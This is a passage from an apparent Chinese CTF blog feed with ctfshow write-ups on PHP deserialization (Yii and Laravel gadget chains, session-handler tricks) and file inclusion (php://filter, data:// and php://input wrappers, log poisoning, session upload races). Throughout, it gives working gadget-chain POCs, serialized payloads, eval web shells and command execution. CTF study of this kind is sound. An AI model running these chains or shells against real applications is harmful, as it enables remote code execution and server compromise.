message()));//结果解码后为O:7:&quot;message&quot;:3:&#123;s:4:&quot;from&quot;;s:1:&quot;1&quot;;s:3:&quot;msg&quot;;s:1:&quot;2&quot;;s:2:&quot;to&quot;;s:31:&quot;fuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;&#125;</code></pre><p>可以看到，这里的s:31:”fuck”中fuck应该是四个字符，而这里却是31个，因为这里的31个字符包含了后面的一堆字符<code>fuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code>，共27个字符，而要使这里的数字于字符数对应，我们就可以用到题目给的字符串替换，将fuck替换成loveU,每替换一次就会多一个字符，不难想到，如果替换27次，那么就相当于这里将后面的常量字符串数量天衣无缝的弥补上了。</p><pre><code>payload:f=1&amp;m=2&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code></pre><p>最后访问message.php即可</p><h3 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h3><p>用扫描器扫到了<a href="http://www.zip和check.php/">www.zip和check.php</a></p><p><a href="http://www.zip中的index.php/">www.zip中的index.php</a>:</p><img src="/2023/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(ctfshow)/205319.png" class=""><p>我们可以通过修改 <code>$COOKIE[&#39;limit&#39;]</code> 来控制 <code>session</code> 的内容。</p><p>inc&#x2F;inc.php:</p><pre><code>&lt;?php...ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);session_start();...class User&#123;    public $username;    public $password;    public $status;    function __construct($username,$password)&#123;        $this-&gt;username = $username;        $this-&gt;password = $password;    &#125;    function setStatus($s)&#123;        $this-&gt;status=$s;    &#125;    function __destruct()&#123;        file_put_contents(&quot;log-&quot;.$this-&gt;username, &quot;使用&quot;.$this-&gt;password.&quot;登陆&quot;.($this-&gt;status?&quot;成功&quot;:&quot;失败&quot;).&quot;----&quot;.date_create()-&gt;format(&#39;Y-m-d H:i:s&#39;));    &#125;&#125;...</code></pre><p>我们需要知道session_start()这个函数已经这个函数所起的作用：</p><p>当会话自动开始或者通过 session_start() 手动开始的时候， PHP 内部会依据客户端传来的PHPSESSID来获取现有的对应的会话数据（即session文件）， PHP 会自动反序列化session文件的内容，并将之填充到 $_SESSION 超级全局变量中。如果不存在对应的会话数据，则创建名为sess_PHPSESSID(客户端传来的)的文件。如果客户端未发送PHPSESSID，则创建一个由32个字母组成的PHPSESSID，并返回set-cookie。</p><p>这里使用 <code>ini_set</code> 指定了 <code>serialize_handler</code> 为 <code>php</code>，如果默认的 <code>serialize_handler</code> 为 <code>php_serialize</code>，就可以通过在序列化的字符串之前加 <code>|</code>，反序列化任意对象。</p><pre><code>php_binary: 存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值php: 存储方式是，键名+竖线+经过serialize()函数序列处理的值php_serialize(php&gt;5.5.4): 存储方式是，经过serialize()函数序列化处理的值</code></pre><p>注意：在 <code>php 5.5.4</code> 以前默认选择的是 <code>php</code>，<code>5.5.4</code> 之后就是 <code>php_serialize</code>，这里的 <code>php</code> 版本为 <code>7.3.11</code>，那么默认就是 <code>php_serialize</code>。</p><p>那么思路就很清晰了，首先在 <code>$COOKIE[&#39;limit&#39;]</code> 中构造 <code>|+序列化对象</code> 的字符串，访问首页写入 <code>session</code>，再通过 <code>check.php</code> 加载的 <code>inc.php</code> 中的 <code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code> 将 <code>session</code> 以 <code>session.serialize_handler=php</code> 的格式反序列化，执行 <code>User</code> 类的 <code>__destruct</code> 方法写 <code>shell</code>。</p><p>首先构造payload:</p><pre><code>&lt;?phpclass User&#123;    public $username = &quot;c.php&quot;;    public $password = &quot;&lt;?php @eval($_POST[1]); ?&gt;&quot;;    public $status;&#125;$a = new User();$target = &#39;|&#39;.serialize($a);var_dump(urlencode(base64_encode($target)));//fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiJjLnBocCI7czo4OiJwYXNzd29yZCI7czoyNjoiPD9waHAgQGV2YWwoJF9QT1NUWzFdKTsgPz4iO3M6Njoic3RhdHVzIjtOO30%3D</code></pre><p>更改 <code>cookie</code> 后访问 <code>index.php</code>,然后访问check.php或inc&#x2F;inc.php进行反序列化，最后访问log-c.php传参即可</p><h3 id="web264-反序列化字符串逃逸"><a href="#web264-反序列化字符串逃逸" class="headerlink" title="web264 反序列化字符串逃逸"></a>web264 反序列化字符串逃逸</h3><p>与262关不同的是这里用的是session，所以不能非预期了</p><p>反序列化字符串逃逸：</p><pre><code>f=1&amp;m=2&amp;t=3fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code></pre><p>访问message.php时还需要在cookie中添加msg，值任意</p><h3 id="web265-反序列化中指针引用"><a href="#web265-反序列化中指针引用" class="headerlink" title="web265 反序列化中指针引用"></a>web265 反序列化中指针引用</h3><p>token的值是一个随机值，我们要想传值给password，使其与token相等是不可能的，那么就只有把password的地址传给token，使password跟着token的改变而改变。</p><pre><code>&lt;?phpclass ctfshowAdmin&#123;    public $token=1;    public $password=1;&#125;$a = new ctfshowAdmin();$a-&gt;password=&amp;$a-&gt;token;//让passwd的值随token变echo serialize($a);//运行结果O:12:&quot;ctfshowAdmin&quot;:2:&#123;s:5:&quot;token&quot;;i:1;s:8:&quot;password&quot;;R:2;&#125;</code></pre><h3 id="web266-php不区分类名的大小写"><a href="#web266-php不区分类名的大小写" class="headerlink" title="web266 php不区分类名的大小写"></a>web266 php不区分类名的大小写</h3><p>php中：</p><pre><code>区分大小写的： 变量名、常量名、数组索引（键名key）不区分大小写的：函数名、方法名、类名、魔术常量、NULL、FALSE、TRUE</code></pre><p>所以这道题解法呼之欲出：因为正则表达式区分了大小写，所以我们可以使用大小写绕过，然后反序列化ctfshow类，这样就不会报错，脚本正常结束之后，就很调用__destruct()魔法方法，输出flag。</p><pre><code>&lt;?phpclass Ctfshow&#123;    &#125;echo serialize(new Ctfshow());//O:7:&quot;Ctfshow&quot;:0:&#123;&#125;</code></pre><img src="/2023/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(ctfshow)/114148.png" class=""><h3 id="web267"><a href="#web267" class="headerlink" title="web267"></a>web267</h3><p>先用admin弱口令登录</p><img src="/2023/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(ctfshow)/155148.png" class=""><p>在about页面发现提示?view-source</p><p>访问url&#x2F;?r&#x3D;site&#x2F;about&amp;view-source得到反序列化点</p><img src="/2023/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(ctfshow)/155604.png" class=""><p>POC:</p><pre><code>&lt;?phpnamespace yii\rest&#123;    class CreateAction&#123;        public $checkAccess;        public $id;        public function __construct()&#123;            $this-&gt;checkAccess = &#39;passthru&#39;;            $this-&gt;id = &#39;tac /flag&#39;;        &#125;    &#125;&#125;namespace Faker&#123;    use yii\rest\CreateAction;    class Generator&#123;        protected $formatters;        public function __construct()&#123;            $this-&gt;formatters[&#39;close&#39;] = [new CreateAction(), &#39;run&#39;];        &#125;    &#125;&#125;namespace yii\db&#123;    use Faker\Generator;    class BatchQueryResult&#123;        private $_dataReader;        public function __construct()&#123;            $this-&gt;_dataReader = new Generator;        &#125;    &#125;&#125;namespace&#123;    echo base64_encode(serialize(new yii\db\BatchQueryResult));&#125;</code></pre><p>get传参，得到flag</p><pre><code>?r=backdoor/shell&amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6ODoicGFzc3RocnUiO3M6MjoiaWQiO3M6OToidGFjIC9mbGFnIjt9aToxO3M6MzoicnVuIjt9fX19</code></pre><h3 id="web268"><a href="#web268" class="headerlink" title="web268"></a>web268</h3><p>这里需要换一条链子：</p><pre><code>&lt;?phpnamespace yii\rest&#123;    class CreateAction&#123;        public $checkAccess;        public $id;        public function __construct()&#123;            $this-&gt;checkAccess = &#39;passthru&#39;;            $this-&gt;id = &#39;ls&#39;;        &#125;    &#125;&#125;namespace Faker&#123;    use yii\rest\CreateAction;    class Generator&#123;        protected $formatters;        public function __construct()&#123;            // 这里需要改为isRunning            $this-&gt;formatters[&#39;isRunning&#39;] = [new CreateAction(), &#39;run&#39;];        &#125;    &#125;&#125;// poc2namespace Codeception\Extension&#123;    use Faker\Generator;    class RunProcess&#123;        private $processes;        public function __construct()        &#123;            $this-&gt;processes = [new Generator()];        &#125;    &#125;&#125;namespace&#123;    echo base64_encode(serialize(new Codeception\Extension\RunProcess()));&#125;?&gt;</code></pre><h3 id="web269"><a href="#web269" class="headerlink" title="web269"></a>web269</h3><pre><code>&lt;?phpnamespace yii\rest&#123;    class CreateAction&#123;        public $checkAccess;        public $id;        public function __construct()&#123;            $this-&gt;checkAccess = &#39;passthru&#39;;            $this-&gt;id = &#39;ls&#39;;        &#125;    &#125;&#125;namespace Faker&#123;    use yii\rest\CreateAction;    class Generator&#123;        protected $formatters;        public function __construct()&#123;            // 这里需要改为isRunning            $this-&gt;formatters[&#39;render&#39;] = [new CreateAction(), &#39;run&#39;];        &#125;    &#125;&#125;namespace phpDocumentor\Reflection\DocBlock\Tags&#123;    use Faker\Generator;    class See&#123;        protected $description;        public function __construct()        &#123;            $this-&gt;description = new Generator();        &#125;    &#125;&#125;namespace&#123;    use phpDocumentor\Reflection\DocBlock\Tags\See;    class Swift_KeyCache_DiskKeyCache&#123;        private $keys = [];        private $path;        public function __construct()        &#123;            $this-&gt;path = new See;            $this-&gt;keys = array(                &quot;axin&quot;=&gt;array(&quot;is&quot;=&gt;&quot;handsome&quot;)            );        &#125;    &#125;    // 生成poc    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));&#125;?&gt;</code></pre><h3 id="web270"><a href="#web270" class="headerlink" title="web270"></a>web270</h3><pre><code>&lt;?phpnamespace yii\rest&#123;    class IndexAction&#123;        public $checkAccess;        public $id;        public function __construct()&#123;            $this-&gt;checkAccess = &#39;passthru&#39;;            $this-&gt;id = &#39;cat /fl*&#39;;        &#125;    &#125;&#125;namespace yii\db&#123;    use yii\web\DbSession;    class BatchQueryResult    &#123;        private $_dataReader;        public function __construct()&#123;            $this-&gt;_dataReader=new DbSession();        &#125;    &#125;&#125;namespace yii\web&#123;    use yii\rest\IndexAction;    class DbSession    &#123;        public $writeCallback;        public function __construct()&#123;            $a=new IndexAction();            $this-&gt;writeCallback=[$a,&#39;run&#39;];        &#125;    &#125;&#125;namespace&#123;    use yii\db\BatchQueryResult;    echo base64_encode(serialize(new BatchQueryResult()));&#125;</code></pre><h3 id="web271"><a href="#web271" class="headerlink" title="web271"></a>web271</h3><p>laravel5.7反序列化</p><pre><code>&lt;?phpnamespace Illuminate\Foundation\Testing&#123;    use Illuminate\Auth\GenericUser;    use Illuminate\Foundation\Application;    class PendingCommand    &#123;        protected $command;        protected $parameters;        public $test;        protected $app;        public function __construct()&#123;            $this-&gt;command=&quot;system&quot;;            $this-&gt;parameters[]=&quot;dir&quot;;            $this-&gt;test=new GenericUser();            $this-&gt;app=new Application();        &#125;    &#125;&#125;namespace Illuminate\Foundation&#123;    class Application&#123;        protected $bindings = [];        public function __construct()&#123;            $this-&gt;bindings=array(                &#39;Illuminate\Contracts\Console\Kernel&#39;=&gt;array(                    &#39;concrete&#39;=&gt;&#39;Illuminate\Foundation\Application&#39;                )            );        &#125;    &#125;&#125;namespace Illuminate\Auth&#123;    class GenericUser    &#123;        protected $attributes;        public function __construct()&#123;            $this-&gt;attributes[&#39;expectedOutput&#39;]=[&#39;hello&#39;,&#39;world&#39;];            $this-&gt;attributes[&#39;expectedQuestions&#39;]=[&#39;hello&#39;,&#39;world&#39;];        &#125;    &#125;&#125;namespace&#123;    use Illuminate\Foundation\Testing\PendingCommand;    echo urlencode(serialize(new PendingCommand()));&#125;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含(ctfshow)</title>
      <link href="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/"/>
      <url>/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/</url>
      
        <content type="html"><![CDATA[<h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><p>看源码：</p><img src="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/110856.png" class=""><p>直接构造?file&#x3D;flag.php，没有结果，因为只是包含了php文件，而php代码是不会显示在前端的</p><p>1.可以使用php:&#x2F;&#x2F;filter伪协议：</p><pre><code>payload：?file=php://filter/convert.base64-encode/resource=flag.php</code></pre><p>2.bp抓包，给file传参?file&#x3D;php:&#x2F;&#x2F;input然后在post输出想要执行的代码</p><img src="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/150032.png" class=""><p>3.也可以用data伪协议</p><pre><code>?file=data://text/plain,&lt;?php system(&#39;tac flag.php&#39;);?&gt;?file=data://text/plain,&lt;?=eval($_POST[1])?&gt;</code></pre><h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><p>这一关用???代替了php</p><p>1.使用data协议：</p><pre><code>?file=data://text/plain,&lt;?Php system(&#39;tac flag.php&#39;);?&gt; //注意&lt;?php第一个p大写?file=data://text/plain,&lt;?= system(&#39;tac flag.php&#39;);?&gt; ?file=data://text/plain;base64,PD89IHN5c3RlbSgndGFjIGZsYWcuPz8/Jyk7Pz4=</code></pre><p>2.php:&#x2F;&#x2F;input伪协议</p><pre><code>?file=Php://input再post：&lt;?php system(&quot;tac flag.php&quot;);?&gt;</code></pre><h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3><p>php和data都被替换了</p><p>1.php:&#x2F;&#x2F;input伪协议（大小写绕过）</p><pre><code>?file=Php://input再post：&lt;?php system(&quot;tac flag.php&quot;);?&gt;</code></pre><p>2.日志文件包含，伪造UA写入php代码</p><p>日志文件记录了服务器收到的每一次请求的</p><p>IP、访问时间、URL、User-Agent，这4项中的前两项的值都是我们无法控制的，我们只能在自己可以控制的字段上做手脚，其中URL字段由于URL编码的存在，空格等一些符号会自动进行url编码，存到日志当中时，不是一个正确的php语句，无法成功执行，而User-Agent则不会被进行任何二次处理，我们发什么内容，服务器就将其原封不动的写入日志。</p><p>nginx日志文件在&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><p>先写入日志：</p><img src="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/201035.png" class=""><p>再包含日志，执行代码：</p><img src="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/202243.png" class=""><h3 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h3><p>这道题过滤了冒号，所以远程文件包含和大小写绕过不行了，只能用日志包含，同上题</p><h3 id="web82-session文件包含"><a href="#web82-session文件包含" class="headerlink" title="web82-session文件包含"></a>web82-session文件包含</h3><p>参考<a href="https://www.cnblogs.com/NPFS/p/13795170.html">https://www.cnblogs.com/NPFS/p/13795170.html</a></p><p><a href="https://blog.csdn.net/qq_46918279/article/details/120106832">https://blog.csdn.net/qq_46918279/article/details/120106832</a></p><pre><code class="markdown">PHP里面唯一我们能控制的没有后缀的文件就是session文件利用PHP_SESSION_UPLOAD_PROGRESS写入session文件加条件竞争达到文件包含的目的1. session.upload_progress.enabled = on2. session.upload_progress.cleanup = on（默认开启）3. session.upload_progress.prefix = &quot;upload_progress_&quot;（默认）4. session.upload_progress.name = &quot;$PHP_SESSION_UPLOAD_PROGRESS&quot;（默认）enabled=on表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；cleanup=on表示当文件上传结束后，php将会立即清空对应session文件中的内容name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控也就是PHP_SESSION_UPLOAD_PROGRESS的值可控；prefix+name将表示为session中的键名</code></pre><pre><code class="markdown">大体思路为：1、post一个与ini中设置的session.upload_progress.name的同名变量（默认的name为“PHP_SESSION_UPLOAD_PROGRESS”），那么就会返回上传文件的实时进度并写入session文件中。session文件的内容为:（它会在$_SESSION中添加一组数据, 索引是session.upload_progress.prefix与 session.upload_progress.name连接在一起的值）2、如果我们post传递PHP_SESSION_UPLOAD_PROGRESS的值为一句话木马比如为：&lt;?php system(&#39;ls&#39;);?&gt;3、同时，我们在cookie里面设置名字：PHPSESSID，值：flag，（目的是设置session文件，因为这样我们才能知道实时进度（一句话木马）上传到哪里了）；那么在/tem/sess_flag这个文件的内容就为upload_progress_&lt;?php system(&#39;ls&#39;)?&gt;。然后在include（/tem/sess_flag）就会执行后面的php代码从而成功执行rce。4、虽然文件上传结束后，php会清空session文件中的内容，但是如果我们边上传边去访问/tem/sess_aaa进行条件竞争，那么就有可能在删除session文件前访问到这个文件。</code></pre><p>我们能够创建session文件的原因：session里有一个默认选项，session.use_strict_mode默认值为off。也就是说此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID&#x3D;aaa，PHP将会在服务器上创建一个文件：&#x2F;tmp&#x2F;sess_aaa”。即使此时用户没有初始化Session，PHP也会自动初始化Session,并产生一个键值。这个键值ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_aaa文件里。</p><p>操作：1、先构造一个上传文件的页面，对环境上传一个任意的文件，内容也任意，然后抓包。</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://dadcfcfb-217c-4393-817b-acf2a96574b7.challenge.ctf.show/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;    &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>2、 修改上传文件包</p><img src="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/233813.png" class=""><p>注意两点：</p><p>（1）设置Cookie：PHPSEESSID&#x3D;flag、这样我们的session就为&#x2F;tmp&#x2F;sess_flag</p><p>（2）设置同名变量PHP_SESSION_UPLOAD_PROGRESS，设置值为我们想要存入session文件的代码。（把第一步中value&#x3D;123的改掉即可，这里对123加上§§是为了进行爆破payload用）<br>3、包含session文件，抓包</p><img src="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/234110.png" class=""><p>这里§a§是为了方便爆破用</p><p>4、进行爆破</p><p>payload数量可以设置10000次，也可以使用无数次。</p><p>设置线程数（用了30）</p><p>然后一起爆破（先对上传文件包点击attack，在对&#x2F;tmp&#x2F;sess_flag文件包含包点击attack，也可以不管顺序，因为爆破次数有很多）</p><img src="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/235457.png" class=""><p> 最后将ls改成tac fl0g.php就行 </p><h3 id="web83"><a href="#web83" class="headerlink" title="web83"></a>web83</h3><p><strong>session_unset();</strong><br>释放当前在内存中已经创建的所有$_SESSION变量，但不删除session文件以及不释放对应的sessionid<br><strong>session_destroy();</strong><br>删除当前用户对应的session文件以及释放sessionid，内存中的$_SESSION变量内容依然保留<br>所以这两个函数等同于将内存中的$_SESSION变量释放且删除了session文件和释放sessionid，我们是无法进行session文件包含的。但是：我们的脚本或者bp仍然能够进行包含。原因在于多线程竞争：</p><pre><code class="markdown">什么是多线程竞争线程是非独立的，同一个进程里线程是数据共享的，当当各个线程访问数据资源时会出现竞争状态即:数据几乎同步会被多个线程占用，造成数据混乱，即所谓的线程不安全 。这样，因为在执行session_unset()与执行session_destroy()的时候有间隔，他们与include($file)直接也会有间隔，我们其中的一个线程在删除session文件，而另一个线程刚刚又创建了一个session文件，然后前面的线程又开始包含，那么还是能够正常包含。怎么解决多线程竞争问题?---锁锁的好处: 确保了某段关键代码(共享数据资源)只能由一个线程从头到尾完整地执行能解决多线程资 源竞争下的原子操作问题。锁的坏处: 阻止了多线程并发执行，包含锁的某段代码实际上只能以单线程模式执行，效率就大大地下 降了锁的致命问题: 死锁 </code></pre><h3 id="web84"><a href="#web84" class="headerlink" title="web84"></a>web84</h3><p>system(“rm -rf &#x2F;tmp&#x2F;*”)会强制删除&#x2F;tmp&#x2F;下的所有文件</p><p>还是web82的方法，多线程竞争理解</p><h3 id="web85"><a href="#web85" class="headerlink" title="web85"></a>web85</h3><p>file_exists — 检查文件或目录是否存在,如果由指定的文件或目录存在则返回 true，否则返回 false。</p><p>file_get_contents — 将整个文件读入一个字符串,函数返回读取到的数据， 或者在失败时返回 false。</p><p>strpos — 查找字符串首次出现的位置,返回 needle 存在于 haystack 字符串起始的位置(独立于 offset)。同时注意字符串位置是从0开始，而不是从1开始的。如果没找到 needle，将返回 false。</p><p>还是web82的方法、同样的道理：多线程竞争理解</p><h3 id="web86"><a href="#web86" class="headerlink" title="web86"></a>web86</h3><p>知识点：</p><pre><code class="markdown">define — 定义一个常量dirname：返回 path 的父目录。 如果在 path 中没有斜线，则返回一个点（&#39;.&#39;），表示当前目录。否则返回的是把 path 中结尾的/component（最后一个斜线以及后面部分）去掉之后的字符串。set_include_path — 设置include函数中 include_path 配置选项，成功时返回旧的 include_path或者在失败时返回 false。include被包含文件先按参数给出的路径寻找，如果没有给出目录（只有文件名）时则按照 include_path指定的目录寻找。如果在 include_path下没找到该文件则 include 最后才在调用脚本文件所在的目录和当前工作目录下寻找。如果最后仍未找到文件则 include 结构会发出一条警告；这一点和require 不同，后者会发出一个致命错误。如果定义了路径——不管是绝对路径（在 Windows 下以盘符或者 \ 开头，在 Unix/Linux 下以 / 开头）还是当前目录的相对路径（以 . 或者 .. 开头）——include_path都会被完全忽略。例如一个文件以 ../ 开头，则解析器会在当前目录的父目录下寻找该文件。</code></pre><p>还是web82的方法、同样的道理：多线程竞争理解</p><p>因为设置了目录&#x2F;tmp&#x2F;sess_flag，所以set_include_path对我们的脚本没有用。</p><h3 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h3><pre><code class="php">&lt;?phpif(isset($_GET[&#39;file&#39;]))&#123;    $file = $_GET[&#39;file&#39;];    $content = $_POST[&#39;content&#39;];    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);    file_put_contents(urldecode($file), &quot;&lt;?php die(&#39;大佬别秀了&#39;);?&gt;&quot;.$content);&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>参考<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list">谈一谈php:&#x2F;&#x2F;filter的妙用</a></p><p>​<a href="https://xz.aliyun.com/t/8163#toc-3">file_put_content和死亡·杂糅代码之缘</a></p><p>方法1：base64编码</p><p>这道题，向文件输入内容的时候会在开头写入死亡函数，从而导致直接结束代码的执行，我们要做的就是绕过这个死亡函数。</p><p>编码时，转换成Base64的最小单位就是3个字节</p><p>解码时，4个字节为一组；PHP在解码base64时，遇到不在其中的字符时，将会忽略这些字符，仅将合法字符组成一个新的字符串进行解码（Base64的字符选用了”A-Z、a-z、0-9、+、&#x2F;“ 64个可打印字符）所以，通过base64解码过滤之后就只有 phpdie6  个字符我们就要添加2个字符让phpdie和我们增加的两个字符组合起来进行解码。即可抹掉死亡函数。</p><p>其次：因为filename那里需要urldecode，而get传参的时候会进行一次urldecode，所以我们的filename需要两次urlencode。?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.php这里需要进行url全编码，不然php会被过滤掉。<br>将&lt;?php eval($_POST[1]);?&gt;进行base64编码为：PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+，注意如果直接传入content，这里的+会被当做空格处理，所以在base64解码的时候就会忽略空格，自动在后面加上一个&#x3D;：即PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8&#x3D;，解码后：&lt;?php eval($_POST[1]);?   这样传进去就会报错</p><p>解决方法：将+进行urlencode或直接去掉?&gt;</p><img src="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/202243.png" class=""><p>方法2：rot13编码</p><p>条件：在PHP不开启short_open_tag（短标签）时</p><pre><code>payload:?file=%25%37%30%25%36%38%25%37%30%25%33%41%25%32%46%25%32%46%25%36%36%25%36%39%25%36%43%25%37%34%25%36%35%25%37%32%25%32%46%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%44%25%37%33%25%37%34%25%37%32%25%36%39%25%36%45%25%36%37%25%32%45%25%37%32%25%36%46%25%37%34%25%33%31%25%33%33%25%32%46%25%37%32%25%36%35%25%37%33%25%36%46%25%37%35%25%37%32%25%36%33%25%36%35%25%33%44%25%33%33%25%32%45%25%37%30%25%36%38%25%37%30//?file=php://filter/write=string.rot13/resource=3.php//对写的内容进行rot13编码。content=&lt;?cuc riny($_CBFG[1]);?&gt;//&lt;?php eval($_POST[1]);?&gt;//rot13两次解码后会变成原来的样子。所以我们将传入的content进行一次rot13编码，然后在写入3.php的时候在进行rot13编码，那么写入文件的时候就会写入&lt;?php eval($_POST[1]);?&gt;。//而&lt;?php die(&#39;大佬别秀了&#39;);?&gt;只会进行一次rot13编码，写入文件的时候就不是一个正常的php代码格式。</code></pre><h3 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h3><p>这关过滤了很多，但有个data没有过滤</p><pre><code>data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbJ3NoZWxsJ10pOz8%2B //+号可以用%2b编码data://text/plain;base64,&lt;?php eval($_POST[&#39;shell&#39;]);?&gt;</code></pre><h3 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h3><p>misc,看起来比较麻烦，先放着</p><h3 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h3><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php:&#x2F;&#x2F;filter的妙用 | 离别歌</a></p><p>这关没有过滤php，那么我们就可以通过php:&#x2F;&#x2F;filter&#x2F;write来写入文件，然后通过编码绕过死亡函数，因为这里过滤了base64和rot13，string，所以得用其他的编码。</p><pre><code>convert.iconv.这个过滤器需要 php 支持 iconv，而 iconv 是默认编译的。使用convert.iconv.*过滤器等同于用iconv()函数处理所有的流数据。 然而 我们可以留意到 iconv — 字符串按要求的字符编码来转换;;其用法：iconv ( string $in_charset , string $out_charset , string $str ) : string 将字符串 str 从 in_charset 转换编码到 out_charset。 就其功能而论，有点类似于base_convert的功效一样，只不过二者还是有作用的区别，只是都是涉及编码转换的问题而已；那么我们就可以借用此过滤器，从而进行编码的转换，写入我们需要的代码，然后转换掉死亡代码，其实本质上来说也是利用了编码的转换；</code></pre><p><strong>usc-2</strong>编码：这个是将前后两个字符进行交替(abcd&#x3D;&#x3D;&gt;badc)，所以写入文件的&lt;?php die();?&gt;就会被扰乱，从而绕过。</p><pre><code>get: ?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=1.phppost:contents=?&lt;hp pvela$(P_SO[T]1;)&gt;?然后访问1.php post:1=system(&#39;tac f*&#39;);</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传(upload-labs)</title>
      <link href="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/"/>
      <url>/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/</url>
      
